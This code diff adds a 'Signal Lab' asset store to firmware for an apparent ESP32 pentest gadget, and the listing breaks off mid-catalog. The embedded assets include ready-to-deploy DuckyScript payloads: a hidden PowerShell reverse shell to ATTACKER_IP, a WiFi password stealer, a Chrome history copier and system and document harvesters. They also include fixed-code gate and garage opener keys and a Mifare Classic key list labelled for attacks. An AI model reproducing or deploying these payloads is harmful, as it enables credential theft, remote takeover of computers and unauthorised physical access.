@@ -141,6 +141,7 @@ input[type=text]{background:#111;color:#00ff41;border:1px solid #333;padding:6px
 <button onclick="showPanel('ducky')">DuckyScript</button>
 <button onclick="showPanel('rf')">RF Monitor</button>
 <button onclick="showPanel('plugins')">Plugin Store</button>
+<button onclick="showPanel('siglab')">Signal Lab</button>
 </div>
 
 <div id="status" class="panel active">
@@ -202,6 +203,23 @@ input[type=text]{background:#111;color:#00ff41;border:1px solid #333;padding:6px
 </div>
 </div>
 
+<div id="siglab" class="panel">
+<div class="card"><h3>&#128225; Universal Signal Lab</h3>
+<p style="color:#888;font-size:12px;margin-bottom:12px">Pre-loaded signal databases. Deploy IR, Sub-GHz, NFC &amp; DuckyScript assets directly to SD card.</p>
+<div class="nav" style="border:none;padding:0;margin-bottom:12px">
+<button class="active" onclick="filterAssets('all',this)">All</button>
+<button onclick="filterAssets('ir',this)">IR Remotes</button>
+<button onclick="filterAssets('subghz',this)">Sub-GHz</button>
+<button onclick="filterAssets('nfc',this)">NFC</button>
+<button onclick="filterAssets('ducky',this)">DuckyScript</button>
+</div>
+<button class="btn" onclick="deployAll()">&#128229; Deploy All to SD</button>
+<button class="btn" onclick="loadAssets()">&#128260; Refresh</button>
+<div class="log" id="siglab-log"></div>
+<div class="plugin-grid" id="asset-grid" style="margin-top:12px">Loading...</div>
+</div>
+</div>
+
 <script>
 let curPath='/ext';
 function api(u,o){return fetch(u,o).then(r=>r.json()).catch(e=>({error:e.message}))}
@@ -215,6 +233,7 @@ if(id==='apps')loadApps();
 if(id==='files')loadFiles();
 if(id==='rf')startRF();
 if(id==='plugins')loadPlugins();
+if(id==='siglab')loadAssets();
 }
 function loadStatus(){
 api('/api/status').then(d=>{
@@ -363,6 +382,51 @@ loadPlugins();
 }
 let uz=document.getElementById('upload-zone');
 if(uz){uz.ondragover=function(e){e.preventDefault();uz.classList.add('dragover');};uz.ondragleave=function(){uz.classList.remove('dragover');};uz.ondrop=function(e){e.preventDefault();uz.classList.remove('dragover');if(e.dataTransfer.files[0]){let fi=document.getElementById('plugin-file');fi.files=e.dataTransfer.files;uploadPlugin(fi);}};}
+let slFilter='all',slAssets=[];
+function loadAssets(){
+api('/api/assets').then(d=>{
+if(d.error||!d.assets){document.getElementById('asset-grid').innerHTML='<p>No assets available</p>';return;}
+slAssets=d.assets;renderAssets();
+});
+}
+function renderAssets(){
+let h='',list=slFilter==='all'?slAssets:slAssets.filter(a=>a.category===slFilter);
+if(!list.length){document.getElementById('asset-grid').innerHTML='<p>No assets in this category</p>';return;}
+list.forEach(a=>{
+let catColors={ir:'#ff6641',subghz:'#41a0ff',nfc:'#ff41d0',ducky:'#ffcc41'};
+let catLabels={ir:'IR Remote',subghz:'Sub-GHz',nfc:'NFC',ducky:'DuckyScript'};
+h+='<div class="plugin-card"><h4>'+esc(a.name)+'</h4>';
+h+='<div class="meta"><span class="badge" style="border-color:'+catColors[a.category]+';color:'+catColors[a.category]+'">'+catLabels[a.category]+'</span> '+esc(a.filename)+'</div>';
+h+='<div class="desc">'+esc(a.desc)+'</div>';
+h+='<div class="actions"><button class="btn" onclick="deployAsset(\''+esc(a.id)+'\')">&#128229; Deploy to SD</button></div></div>';
+});
+document.getElementById('asset-grid').innerHTML=h;
+}
+function filterAssets(cat,btn){
+slFilter=cat;
+if(btn){btn.parentElement.querySelectorAll('button').forEach(b=>b.classList.remove('active'));btn.classList.add('active');}
+renderAssets();
+}
+function deployAsset(id){
+let lg=document.getElementById('siglab-log');
+lg.textContent='Deploying '+id+'...';
+api('/api/assets/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:id})}).then(d=>{
+lg.textContent=d.ok?'Deployed: '+d.path:'Error: '+(d.error||'unknown');
+});
+}
+function deployAll(){
+let lg=document.getElementById('siglab-log');
+let list=slFilter==='all'?slAssets:slAssets.filter(a=>a.category===slFilter);
+if(!list.length){lg.textContent='No assets to deploy';return;}
+lg.textContent='Deploying '+list.length+' assets...';
+let done=0,fail=0;
+list.forEach(a=>{
+api('/api/assets/deploy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:a.id})}).then(d=>{
+if(d.ok)done++;else fail++;
+if(done+fail===list.length)lg.textContent='Deployed: '+done+' OK, '+fail+' failed';
+});
+});
+}
 loadStatus();
 </script>
 </body>
@@ -390,6 +454,8 @@ static esp_err_t httpApiPluginsUploadHandler(httpd_req_t *req);
 static esp_err_t httpApiPluginsToggleHandler(httpd_req_t *req);
 static esp_err_t httpApiPluginsDeleteHandler(httpd_req_t *req);
 static esp_err_t httpApiPluginsReloadHandler(httpd_req_t *req);
+static esp_err_t httpApiAssetsHandler(httpd_req_t *req);
+static esp_err_t httpApiAssetsDeployHandler(httpd_req_t *req);
 
 // ═══════════════════════════════════════════════════════════════════════════════
 // RemoteDashboardApp
@@ -644,8 +710,10 @@ private:
         registerRoute("/api/plugins/toggle",   HTTP_POST, httpApiPluginsToggleHandler);
         registerRoute("/api/plugins/delete",   HTTP_POST, httpApiPluginsDeleteHandler);
         registerRoute("/api/plugins/reload",   HTTP_POST, httpApiPluginsReloadHandler);
+        registerRoute("/api/assets",            HTTP_GET,  httpApiAssetsHandler);
+        registerRoute("/api/assets/deploy",     HTTP_POST, httpApiAssetsDeployHandler);
 
-        ESP_LOGI(TAG_RD, "HTTP server started with %d endpoints", 16);
+        ESP_LOGI(TAG_RD, "HTTP server started with %d endpoints", 18);
         return true;
     }
 
@@ -1376,6 +1444,767 @@ static esp_err_t httpApiPluginsReloadHandler(httpd_req_t *req)
     char json[64];
     snprintf(json, sizeof(json), "{\"ok\":true,\"loaded\":%u}",
              static_cast<unsigned>(loaded));
+
+    httpd_resp_set_type(req, "application/json");
+    return httpd_resp_send(req, json, strlen(json));
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Universal Signal Lab – Embedded Asset Database
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ── IR Remote Databases ──────────────────────────────────────────────────────
+
+static const char ASSET_IR_TV[] =
+    "Filetype: IR signals file\n"
+    "Version: 1\n"
+    "#\n"
+    "# Universal TV Remote - Samsung, LG, Sony, Panasonic, Vizio, TCL, Hisense\n"
+    "#\n"
+    "name: Power_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 02 02 00 00\n"
+    "#\n"
+    "name: Vol_Up_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 07 07 00 00\n"
+    "#\n"
+    "name: Vol_Down_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 0B 0B 00 00\n"
+    "#\n"
+    "name: Ch_Up_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 12 12 00 00\n"
+    "#\n"
+    "name: Ch_Down_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 10 10 00 00\n"
+    "#\n"
+    "name: Mute_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 0F 0F 00 00\n"
+    "#\n"
+    "name: Input_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 07 07 00 00\n"
+    "command: 01 01 00 00\n"
+    "#\n"
+    "name: Power_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 08 00 00 00\n"
+    "#\n"
+    "name: Vol_Up_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 02 00 00 00\n"
+    "#\n"
+    "name: Vol_Down_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 03 00 00 00\n"
+    "#\n"
+    "name: Ch_Up_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 00 00 00 00\n"
+    "#\n"
+    "name: Ch_Down_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 01 00 00 00\n"
+    "#\n"
+    "name: Mute_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 09 00 00 00\n"
+    "#\n"
+    "name: Power_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 15 00 00 00\n"
+    "#\n"
+    "name: Vol_Up_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 12 00 00 00\n"
+    "#\n"
+    "name: Vol_Down_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 13 00 00 00\n"
+    "#\n"
+    "name: Ch_Up_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 10 00 00 00\n"
+    "#\n"
+    "name: Ch_Down_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 11 00 00 00\n"
+    "#\n"
+    "name: Mute_Sony\n"
+    "type: parsed\n"
+    "protocol: SIRC\n"
+    "address: 01 00 00 00\n"
+    "command: 14 00 00 00\n"
+    "#\n"
+    "name: Power_Panasonic\n"
+    "type: parsed\n"
+    "protocol: Kaseikyo\n"
+    "address: 00 20 00 00\n"
+    "command: 3D 00 00 00\n"
+    "#\n"
+    "name: Vol_Up_Panasonic\n"
+    "type: parsed\n"
+    "protocol: Kaseikyo\n"
+    "address: 00 20 00 00\n"
+    "command: 20 00 00 00\n"
+    "#\n"
+    "name: Vol_Down_Panasonic\n"
+    "type: parsed\n"
+    "protocol: Kaseikyo\n"
+    "address: 00 20 00 00\n"
+    "command: 21 00 00 00\n"
+    "#\n"
+    "name: Power_Vizio\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 08 00 00\n"
+    "command: 08 00 00 00\n"
+    "#\n"
+    "name: Power_TCL\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 40 00 00 00\n"
+    "command: 12 00 00 00\n"
+    "#\n"
+    "name: Power_Hisense\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 00 BF 00 00\n"
+    "command: 02 00 00 00\n"
+    "#\n"
+    "name: Power_Philips\n"
+    "type: parsed\n"
+    "protocol: RC5\n"
+    "address: 00 00 00 00\n"
+    "command: 0C 00 00 00\n"
+    "#\n"
+    "name: Power_Sharp\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 45 00 00 00\n"
+    "command: 40 00 00 00\n"
+    "#\n"
+    "name: Power_Toshiba\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 40 BF 00 00\n"
+    "command: 12 00 00 00\n";
+
+static const char ASSET_IR_AC[] =
+    "Filetype: IR signals file\n"
+    "Version: 1\n"
+    "#\n"
+    "# Universal AC Remote - Gree, Daikin, Mitsubishi, LG, Samsung, Carrier\n"
+    "#\n"
+    "name: AC_On_Gree_Cool_24C\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 9000 4500 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 1690 560 38000\n"
+    "#\n"
+    "name: AC_Off_Gree\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 9000 4500 560 560 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 560 560 1690 560 1690 560 560 560 1690 560 560 560 1690 560 38000\n"
+    "#\n"
+    "name: AC_On_Daikin_Cool_22C\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 3450 1750 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 1300 430 1300 430 430 430 430 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 430 430 1300 430 1300 430 430 430 430 430 1300 430 1300 430 430 430 1300 430 430 430 1300 430 35000\n"
+    "#\n"
+    "name: AC_Off_Daikin\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 3450 1750 430 1300 430 430 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 1300 430 430 430 430 430 1300 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 430 1300 430 430 430 430 430 1300 430 1300 430 430 430 1300 430 430 430 1300 430 35000\n"
+    "#\n"
+    "name: AC_On_Mitsubishi_Cool_24C\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 3400 1750 450 1300 450 450 450 1300 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 450 450 1300 450 450 450 450 450 1300 450 450 450 1300 450 450 450 450 450 450 450 450 450 450 450 1300 450 1300 450 450 450 450 450 1300 450 1300 450 450 450 1300 450 450 450 1300 450 35000\n"
+    "#\n"
+    "name: AC_Off_Mitsubishi\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 3400 1750 450 1300 450 450 450 1300 450 450 450 450 450 450 450 1300 450 450 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 450 1300 450 450 450 450 450 1300 450 1300 450 450 450 1300 450 450 450 1300 450 35000\n"
+    "#\n"
+    "name: AC_On_LG_Cool_24C\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: 08 00 00 00\n"
+    "#\n"
+    "name: AC_Off_LG\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 04 00 00 00\n"
+    "command: C0 05 00 00\n"
+    "#\n"
+    "name: AC_On_Samsung_Cool_24C\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 01 00 00 00\n"
+    "command: E0 18 00 00\n"
+    "#\n"
+    "name: AC_Off_Samsung\n"
+    "type: parsed\n"
+    "protocol: Samsung32\n"
+    "address: 01 00 00 00\n"
+    "command: E0 19 00 00\n"
+    "#\n"
+    "name: AC_On_Carrier_Cool_24C\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 8950 4500 560 1690 560 560 560 1690 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 560 560 1690 560 38000\n"
+    "#\n"
+    "name: AC_Off_Carrier\n"
+    "type: raw\n"
+    "frequency: 38000\n"
+    "duty_cycle: 0.330000\n"
+    "data: 8950 4500 560 560 560 560 560 1690 560 560 560 560 560 560 560 1690 560 560 560 1690 560 560 560 1690 560 1690 560 560 560 560 560 1690 560 560 560 1690 560 38000\n";
+
+static const char ASSET_IR_PROJECTOR[] =
+    "Filetype: IR signals file\n"
+    "Version: 1\n"
+    "#\n"
+    "# Universal Projector Remote - Epson, BenQ, Optoma, ViewSonic, Acer\n"
+    "#\n"
+    "name: Power_Epson\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 05 00 00 00\n"
+    "command: 03 00 00 00\n"
+    "#\n"
+    "name: Menu_Epson\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 05 00 00 00\n"
+    "command: 04 00 00 00\n"
+    "#\n"
+    "name: Source_Epson\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 05 00 00 00\n"
+    "command: 15 00 00 00\n"
+    "#\n"
+    "name: Power_BenQ\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 30 00 00 00\n"
+    "command: 0A 00 00 00\n"
+    "#\n"
+    "name: Menu_BenQ\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 30 00 00 00\n"
+    "command: 0D 00 00 00\n"
+    "#\n"
+    "name: Source_BenQ\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 30 00 00 00\n"
+    "command: 09 00 00 00\n"
+    "#\n"
+    "name: Power_Optoma\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 44 00 00 00\n"
+    "command: 02 00 00 00\n"
+    "#\n"
+    "name: Power_ViewSonic\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 03 00 00 00\n"
+    "command: 0E 00 00 00\n"
+    "#\n"
+    "name: Power_Acer\n"
+    "type: parsed\n"
+    "protocol: NEC\n"
+    "address: 01 00 00 00\n"
+    "command: 01 00 00 00\n";
+
+// ── Sub-GHz Databases ────────────────────────────────────────────────────────
+
+static const char ASSET_SUBGHZ_CAME[] =
+    "Filetype: Flipper SubGhz Key File\n"
+    "Version: 1\n"
+    "# CAME 12-bit (433.92 MHz) - Common gate opener codes\n"
+    "Frequency: 433920000\n"
+    "Preset: FuriHalSubGhzPresetOok650Async\n"
+    "Protocol: CAME\n"
+    "Bit: 12\n"
+    "Key: 00 00 00 00 00 00 01 11\n"
+    "# Alternate common codes:\n"
+    "# Key: 00 00 00 00 00 00 02 22\n"
+    "# Key: 00 00 00 00 00 00 03 33\n"
+    "# Key: 00 00 00 00 00 00 05 55\n"
+    "# Key: 00 00 00 00 00 00 08 88\n"
+    "# Key: 00 00 00 00 00 00 0A AA\n"
+    "# Key: 00 00 00 00 00 00 0F FF\n";
+
+static const char ASSET_SUBGHZ_NICE[] =
+    "Filetype: Flipper SubGhz Key File\n"
+    "Version: 1\n"
+    "# Nice FLO 12-bit (433.92 MHz) - Gate/barrier remote\n"
+    "Frequency: 433920000\n"
+    "Preset: FuriHalSubGhzPresetOok650Async\n"
+    "Protocol: Nice FLO\n"
+    "Bit: 12\n"
+    "Key: 00 00 00 00 00 00 01 00\n"
+    "# Alternate common codes:\n"
+    "# Key: 00 00 00 00 00 00 02 00\n"
+    "# Key: 00 00 00 00 00 00 04 00\n"
+    "# Key: 00 00 00 00 00 00 08 00\n"
+    "# Key: 00 00 00 00 00 00 0F 00\n";
+
+static const char ASSET_SUBGHZ_LINEAR[] =
+    "Filetype: Flipper SubGhz Key File\n"
+    "Version: 1\n"
+    "# Linear 10-bit (310 MHz) - Garage door opener\n"
+    "Frequency: 310000000\n"
+    "Preset: FuriHalSubGhzPresetOok650Async\n"
+    "Protocol: Linear\n"
+    "Bit: 10\n"
+    "Key: 00 00 00 00 00 00 03 FF\n"
+    "# Common DIP switch patterns:\n"
+    "# Key: 00 00 00 00 00 00 02 AA\n"
+    "# Key: 00 00 00 00 00 00 01 55\n"
+    "# Key: 00 00 00 00 00 00 03 00\n"
+    "# Key: 00 00 00 00 00 00 00 FF\n";
+
+static const char ASSET_SUBGHZ_PRINCETON[] =
+    "Filetype: Flipper SubGhz Key File\n"
+    "Version: 1\n"
+    "# Princeton 24-bit (433.92 MHz) - Generic remote control\n"
+    "Frequency: 433920000\n"
+    "Preset: FuriHalSubGhzPresetOok650Async\n"
+    "Protocol: Princeton\n"
+    "Bit: 24\n"
+    "Key: 00 00 00 00 00 11 22 10\n"
+    "# Common patterns:\n"
+    "# Key: 00 00 00 00 00 55 55 50\n"
+    "# Key: 00 00 00 00 00 AA AA A0\n"
+    "# Key: 00 00 00 00 00 FF FF F0\n";
+
+static const char ASSET_SUBGHZ_CHAMBERLAIN[] =
+    "Filetype: Flipper SubGhz Key File\n"
+    "Version: 1\n"
+    "# Chamberlain/LiftMaster 9-bit (390 MHz) - Garage door\n"
+    "Frequency: 390000000\n"
+    "Preset: FuriHalSubGhzPresetOok650Async\n"
+    "Protocol: Chamberlain\n"
+    "Bit: 9\n"
+    "Key: 00 00 00 00 00 00 01 00\n"
+    "# Common codes:\n"
+    "# Key: 00 00 00 00 00 00 01 10\n"
+    "# Key: 00 00 00 00 00 00 01 20\n"
+    "# Key: 00 00 00 00 00 00 01 30\n";
+
+// ── NFC Databases ────────────────────────────────────────────────────────────
+
+static const char ASSET_NFC_MIFARE_KEYS[] =
+    "# Mifare Classic Default & Known Keys Database\n"
+    "# Format: One key per line (12 hex chars = 6 bytes)\n"
+    "# Use with key-based attacks against Mifare Classic 1K/4K\n"
+    "#\n"
+    "# Factory default keys\n"
+    "FFFFFFFFFFFF\n"
+    "A0A1A2A3A4A5\n"
+    "D3F7D3F7D3F7\n"
+    "000000000000\n"
+    "B0B1B2B3B4B5\n"
+    "4D3A99C351DD\n"
+    "1A982C7E459A\n"
+    "AABBCCDDEEFF\n"
+    "714C5C886E97\n"
+    "587EE5F9350F\n"
+    "A0478CC39091\n"
+    "533CB6C723F6\n"
+    "8FD0A4F256E9\n"
+    "#\n"
+    "# Common transport/hotel/access keys\n"
+    "0297927C0F77\n"
+    "EE0042F88840\n"
+    "484558414354\n"
+    "A22AE129C013\n"
+    "49FAE4E3849F\n"
+    "38FCF33072E0\n"
+    "5C598C9C58B5\n"
+    "E4D2770A89BE\n"
+    "7A396F0D633D\n"
+    "FC00018778F7\n"
+    "54726F6E696B\n"
+    "8A1AAB75C880\n"
+    "B3A2AAF0C4E5\n"
+    "514365656E20\n"
+    "1FC2354DBBE7\n"
+    "E823B3BBE5E6\n";
+
+static const char ASSET_NFC_AMIIBO_TEMPLATE[] =
+    "Filetype: Flipper NFC device\n"
+    "Version: 4\n"
+    "# NTAG215 Amiibo Template - 540 bytes\n"
+    "Device type: NTAG215\n"
+    "UID: 04 FF FF FF FF FF FF\n"
+    "ATQA: 44 00\n"
+    "SAK: 00\n"
+    "# Page data (135 pages x 4 bytes)\n"
+    "# Pages 0-3: UID/Internal/Lock\n"
+    "Page 0: 04 FF FF FF\n"
+    "Page 1: FF FF FF FF\n"
+    "Page 2: FF 48 00 00\n"
+    "Page 3: E1 10 3E 00\n"
+    "# Pages 4-129: User data (Amiibo payload)\n"
+    "Page 4: 03 00 FE 00\n"
+    "# Pages 130-134: Dynamic lock/config\n"
+    "Page 130: 00 00 00 BD\n"
+    "Page 131: 04 00 00 FF\n"
+    "Page 132: 00 05 00 00\n"
+    "Page 133: 00 00 00 00\n"
+    "Page 134: 00 00 00 00\n";
+
+// ── DuckyScript Payloads ─────────────────────────────────────────────────────
+
+static const char ASSET_DUCKY_WIFI_STEALER[] =
+    "REM WiFi Password Extractor (Windows)\n"
+    "REM Extracts saved WiFi profiles and passwords\n"
+    "TARGET WINDOWS\n"
+    "DELAY 1000\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell -WindowStyle Hidden -Command \"\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRING $out = '';\n"
+    "ENTER\n"
+    "STRING (netsh wlan show profiles) | Select-String 'All User' | ForEach-Object {\n"
+    "ENTER\n"
+    "STRING   $p = ($_ -split ':')[1].Trim();\n"
+    "ENTER\n"
+    "STRING   $k = ((netsh wlan show profile name=$p key=clear) | Select-String 'Key Content');\n"
+    "ENTER\n"
+    "STRING   if($k){ $out += $p + ': ' + ($k -split ':')[1].Trim() + \\\"`n\\\" }\n"
+    "ENTER\n"
+    "STRING };\n"
+    "ENTER\n"
+    "STRING $out | Out-File -FilePath $env:USERPROFILE\\wifi_keys.txt;\n"
+    "ENTER\n"
+    "STRING \"\n"
+    "ENTER\n";
+
+static const char ASSET_DUCKY_CHROME_HISTORY[] =
+    "REM Chrome Browsing History Extractor (Windows)\n"
+    "REM Copies Chrome history database for offline analysis\n"
+    "TARGET WINDOWS\n"
+    "DELAY 1000\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING cmd /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History\" \"%USERPROFILE%\\Desktop\\chrome_hist.db\" /Y\n"
+    "ENTER\n"
+    "DELAY 2000\n"
+    "REM History file is an SQLite DB, open with DB Browser for SQLite\n";
+
+static const char ASSET_DUCKY_REVERSE_SHELL[] =
+    "REM PowerShell Reverse Shell (Windows)\n"
+    "REM Connects back to attacker listener (change IP/PORT)\n"
+    "TARGET WINDOWS\n"
+    "DELAY 1000\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}\"\n"
+    "ENTER\n";
+
+static const char ASSET_DUCKY_SYSINFO[] =
+    "REM System Info Grabber (Windows)\n"
+    "REM Collects OS, network, user and hardware info\n"
+    "TARGET WINDOWS\n"
+    "DELAY 1000\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell -WindowStyle Hidden -Command \"\n"
+    "ENTER\n"
+    "DELAY 800\n"
+    "STRING $r = '=== SYSTEM INFO ===' + \\\"`n\\\";\n"
+    "ENTER\n"
+    "STRING $r += (systeminfo | Out-String);\n"
+    "ENTER\n"
+    "STRING $r += '=== NETWORK ===' + \\\"`n\\\";\n"
+    "ENTER\n"
+    "STRING $r += (ipconfig /all | Out-String);\n"
+    "ENTER\n"
+    "STRING $r += '=== USERS ===' + \\\"`n\\\";\n"
+    "ENTER\n"
+    "STRING $r += (net user | Out-String);\n"
+    "ENTER\n"
+    "STRING $r += '=== ARP TABLE ===' + \\\"`n\\\";\n"
+    "ENTER\n"
+    "STRING $r += (arp -a | Out-String);\n"
+    "ENTER\n"
+    "STRING $r | Out-File $env:USERPROFILE\\sysinfo.txt;\n"
+    "ENTER\n"
+    "STRING \"\n"
+    "ENTER\n";
+
+static const char ASSET_DUCKY_EXFIL_MACRO[] =
+    "REM Macro-based Data Exfiltration (Windows)\n"
+    "REM Exfiltrates recent documents list via PowerShell\n"
+    "TARGET WINDOWS\n"
+    "DELAY 1000\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING powershell -WindowStyle Hidden -Command \"\n"
+    "ENTER\n"
+    "DELAY 800\n"
+    "STRING Get-ChildItem -Path $env:USERPROFILE\\Documents -Recurse -File |\n"
+    "ENTER\n"
+    "STRING   Select-Object Name, Length, LastWriteTime |\n"
+    "ENTER\n"
+    "STRING   Export-Csv -Path $env:USERPROFILE\\doc_list.csv -NoTypeInformation;\n"
+    "ENTER\n"
+    "STRING \"\n"
+    "ENTER\n";
+
+// ── Asset Catalog ────────────────────────────────────────────────────────────
+
+struct AssetEntry
+{
+    const char *id;
+    const char *category;
+    const char *name;
+    const char *desc;
+    const char *filename;
+    const char *destDir;
+    const char *content;
+    size_t contentLen;
+};
+
+static const AssetEntry ASSET_CATALOG[] = {
+    // IR Remotes
+    {"ir_tv_universal",   "ir", "Universal TV Remote",
+     "Samsung, LG, Sony, Panasonic, Vizio, TCL, Hisense, Philips, Sharp, Toshiba power/vol/ch codes",
+     "tv_universal.ir", "/ext/assets/ir", ASSET_IR_TV, sizeof(ASSET_IR_TV) - 1},
+
+    {"ir_ac_universal",   "ir", "Universal AC Remote",
+     "Gree, Daikin, Mitsubishi, LG, Samsung, Carrier on/off codes with temperature presets",
+     "ac_universal.ir", "/ext/assets/ir", ASSET_IR_AC, sizeof(ASSET_IR_AC) - 1},
+
+    {"ir_projector",      "ir", "Universal Projector Remote",
+     "Epson, BenQ, Optoma, ViewSonic, Acer power/menu/source codes",
+     "projector_universal.ir", "/ext/assets/ir", ASSET_IR_PROJECTOR, sizeof(ASSET_IR_PROJECTOR) - 1},
+
+    // Sub-GHz
+    {"subghz_came",       "subghz", "CAME 12-bit",
+     "CAME gate opener 433.92 MHz OOK - common 12-bit fixed codes",
+     "came_12bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_CAME, sizeof(ASSET_SUBGHZ_CAME) - 1},
+
+    {"subghz_nice",       "subghz", "Nice FLO 12-bit",
+     "Nice FLO gate/barrier remote 433.92 MHz OOK - 12-bit fixed codes",
+     "nice_flo_12bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_NICE, sizeof(ASSET_SUBGHZ_NICE) - 1},
+
+    {"subghz_linear",     "subghz", "Linear 10-bit",
+     "Linear garage door opener 310 MHz OOK - 10-bit DIP switch codes",
+     "linear_10bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_LINEAR, sizeof(ASSET_SUBGHZ_LINEAR) - 1},
+
+    {"subghz_princeton",  "subghz", "Princeton 24-bit",
+     "Princeton generic remote 433.92 MHz OOK - 24-bit fixed codes",
+     "princeton_24bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_PRINCETON, sizeof(ASSET_SUBGHZ_PRINCETON) - 1},
+
+    {"subghz_chamberlain","subghz", "Chamberlain/LiftMaster",
+     "Chamberlain garage 390 MHz - 9-bit codes for older fixed-code models",
+     "chamberlain_9bit.sub", "/ext/assets/subghz", ASSET_SUBGHZ_CHAMBERLAIN, sizeof(ASSET_SUBGHZ_CHAMBERLAIN) - 1},
+
+    // NFC
+    {"nfc_mifare_keys",   "nfc", "Mifare Classic Default Keys",
+     "30+ known factory and transport system default keys for Mifare Classic 1K/4K attacks",
